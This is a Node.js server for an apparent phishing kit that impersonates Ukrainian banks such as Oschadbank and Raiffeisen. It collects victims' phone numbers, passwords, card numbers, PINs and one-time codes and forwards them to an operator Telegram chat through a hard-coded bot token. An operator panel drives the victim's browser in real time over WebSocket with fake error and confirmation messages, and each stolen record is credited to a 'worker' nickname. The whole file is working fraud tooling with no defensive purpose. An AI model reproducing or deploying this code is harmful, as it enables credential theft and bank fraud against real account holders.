const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';

// Dynamic webhook setup for Render
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

// Banks with "Request" button
const banksForRequestButton = [
    'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
    'Восток', 'Izibank', 'Укрсиб'
];

const app = express();
app.use(express.json());
app.use(cors());

// Request logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} ${JSON.stringify(req.body)}`);
    next();
});

// Serve static files
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

// Telegram bot setup
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook set to ${WEBHOOK_URL}`))
        .catch(err => console.error('Webhook setup error:', err));
    bot.sendMessage(CHAT_ID, `СЕРВЕР ПЕРЕЗАПУЩЕН! (v5 - стабильная) Хорошего ворка! Тест от ${new Date().toISOString()}`, { parse_mode: 'HTML' })
        .catch(err => console.error('Test message error:', err));
} else {
    console.error('Critical error: RENDER_EXTERNAL_URL not defined. Webhook not set.');
}

bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

// Webhook endpoint
app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// WebSocket setup
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();
const cardVisitCounts = new Map();
const waitingForCustomMessage = new Map();

// WebSocket connection handling
wss.on('connection', (ws) => {
    console.log('WebSocket client connected');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('WebSocket message error:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('WebSocket error:', error));
});

// Telegram callback query handling
bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    const sessionData = sessions.get(sessionId) || {};
    const bankName = sessionData.bankName || '';

    if (type === 'custom_message') {
        waitingForCustomMessage.set(callbackQuery.message.chat.id, sessionId);
        bot.sendMessage(callbackQuery.message.chat.id, `✏️ Введите сообщение для клиента <code>${sessionId}</code>:`, {
            parse_mode: 'HTML',
            reply_markup: { force_reply: true }
        }).then((sentMessage) => {
            waitingForCustomMessage.set('reply_to_message_id', sentMessage.message_id);
        });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};
        switch (type) {
            case 'sms':
                commandData = { text: 'Вам відправлено SMS з кодом...' };
                break;
            case 'lk':
            case 'call':
            case 'telegram_debit':
                commandData = { bankName };
                break;
            case 'password_error':
                commandData = { loginType: sessionData.loginMethod || 'phone' };
                break;
            case 'code_error':
                commandData = { screenId: sessionData.lastCodeScreen || 'oschad_call' };
                break;
            case 'pin_error':
                commandData = { text: 'Ви не змогли підтвердити володіння карткою...' };
                break;
            case 'number_error':
                commandData = { text: 'Вказано не фінансовий номер телефону...' };
                break;
            case 'request_details':
                commandData = { isRaiffeisen: bankName === 'Райффайзен' };
                break;
            case 'other':
                commandData = { text: 'В нас не вийшло автентифікувати вашу картку...', bankName };
                break;
            case 'timer':
                commandData = { text: 'Код підтверджено успішно!' };
                break;
            case 'ban':
                commandData = {};
                break;
        }
        ws.send(JSON.stringify({ type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
    }
});

// Inline keyboard for Oschadbank and non-Oschadbank flows
function getInlineKeyboard(sessionId, bankName) {
    const keyboard = [
        [
            { text: 'SMS', callback_data: `sms:${sessionId}` },
            { text: 'ЛК', callback_data: `lk:${sessionId}` },
            { text: 'Звонок', callback_data: `call:${sessionId}` }
        ],
        [
            { text: 'Невірний пароль', callback_data: `password_error:${sessionId}` },
            { text: 'Telegram Debit', callback_data: `telegram_debit:${sessionId}` },
            { text: 'КОД', callback_data: `code_error:${sessionId}` }
        ],
        [
            { text: 'Невірний ПІН', callback_data: `pin_error:${sessionId}` },
            { text: 'КОД ✅', callback_data: `timer:${sessionId}` },
            { text: 'Номер', callback_data: `number_error:${sessionId}` }
        ],
        [
            { text: 'OTHER', callback_data: `other:${sessionId}` },
            { text: 'BAN 🚫', callback_data: `ban:${sessionId}` },
            { text: 'СВОЙ ✏️', callback_data: `custom_message:${sessionId}` }
        ]
    ];

    if (banksForRequestButton.includes(bankName)) {
        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
    }

    return { inline_keyboard: keyboard };
}

// Handle form submissions
app.post('/api/submit', async (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Referrer decode error:', e);
    }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    // Send data to Telegram based on flow and data
    let message = '';
    const ws = clients.get(sessionId);
    const isOnline = ws && ws.readyState === WebSocket.OPEN;

    try {
        if (newData.currentFlow === 'forgot_password' && newData.fp_pin) {
            // Send only when all forgot password data is collected
            message = `<b>Название банка:</b> Ощад24\n`;
            message += `<b>Мобильный:</b> <code>${newData.fp_phone || 'N/A'}</code>\n`;
            message += `<b>Номер карты:</b> <code>${newData.fp_card || 'N/A'}</code>\n`;
            message += `<b>Пин:</b> <code>${newData.fp_pin || 'N/A'}</code>\n`;
            message += `<b>Воркер:</b> @${workerNick}\n`;
            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'HTML',
                reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
            });
        } else if (newData.loginMethod === 'phone' && newData.phone && newData.password) {
            message = `<b>Название банка:</b> Ощад24\n`;
            message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
            message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
            message += `<b>Воркер:</b> @${workerNick}\n`;
            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'HTML',
                reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
            });
        } else if (newData.loginMethod === 'login' && newData.login && newData.password) {
            message = `<b>Название банка:</b> Ощад24\n`;
            message += `<b>Логин:</b> <code>${newData.login}</code>\n`;
            message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
            message += `<b>Воркер:</b> @${workerNick}\n`;
            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'HTML',
                reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
            });
        } else if (newData.bankName && newData.bankName !== 'Ощадбанк') {
            // For non-Oschadbank flows
            message = `<b>Название банка:</b> ${newData.bankName}\n`;
            if (newData.phone) message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
            if (newData.card) message += `<b>Номер карты:</b> <code>${newData.card}</code>\n`;
            message += `<b>Воркер:</b> @${workerNick}\n`;
            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'HTML',
                reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
            });
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }

    if (isFinalStep && !newData.logSent) {
        newData.logSent = true;
        const cardNumber = newData.card_confirm || newData.card || newData.fp_card;
        if (cardNumber) {
            const visitCount = (cardVisitCounts.get(cardNumber) || 0) + 1;
            cardVisitCounts.set(cardNumber, visitCount);
        }
    }

    res.status(200).json({ message: 'OK' });
});

// Handle code submissions
app.post('/api/sms', async (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Referrer decode error:', e);
    }

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        const codeType = sessionData.lastCodeScreen === 'oschad_call' ? 'Код со звонка' : 'Код списания';
        let message = `<b>${codeType}:</b> <code>${code}</code>\n`;
        message += `<b>Номер телефону:</b> <code>${sessionData.phone || sessionData.fp_phone || 'N/A'}</code>\n`;
        message += `<b>Воркер:</b> @${workerNick}\n`;
        try {
            await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
            res.status(200).json({ message: 'OK' });
        } catch (error) {
            console.error('Error sending code to Telegram:', error);
            res.status(500).json({ message: 'Failed to send code to Telegram' });
        }
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

// Handle custom message replies
bot.on('message', (msg) => {
    if (msg.reply_to_message && msg.reply_to_message.message_id === waitingForCustomMessage.get('reply_to_message_id')) {
        const sessionId = waitingForCustomMessage.get(msg.chat.id);
        const ws = clients.get(sessionId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'custom_message_text', data: { text: msg.text } }));
            bot.sendMessage(msg.chat.id, `✅ Сообщение отправлено <code>${sessionId}</code>.`, { parse_mode: 'HTML' });
        } else {
            bot.sendMessage(msg.chat.id, `❌ Не удалось отправить. Клиент <code>${sessionId}</code> не в сети.`, { parse_mode: 'HTML' });
        }
        waitingForCustomMessage.delete(msg.chat.id);
        waitingForCustomMessage.delete('reply_to_message_id');
    }
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
